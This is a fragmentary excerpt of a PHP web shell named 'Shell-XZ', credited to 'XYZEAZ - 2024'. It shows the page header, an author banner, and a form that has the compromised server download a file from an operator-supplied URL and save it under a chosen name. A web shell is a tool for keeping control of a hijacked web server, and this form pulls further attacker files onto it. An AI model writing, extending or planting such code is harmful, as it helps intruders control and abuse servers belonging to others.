...
<html>
<head>
	<title>Shell-XZ</title>
	<link rel="icon" type="image/x-icon" href="https://e.top4top.io/p_3206t1vx91.png">
</head>
...
function author() {
	echo "<center><br>XYZEAZ - 2024</center>";
	exit();
}
...
<input type="text" name="darilink" class="up" placeholder="https://xyz.xyz/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
echo "</table><br>";
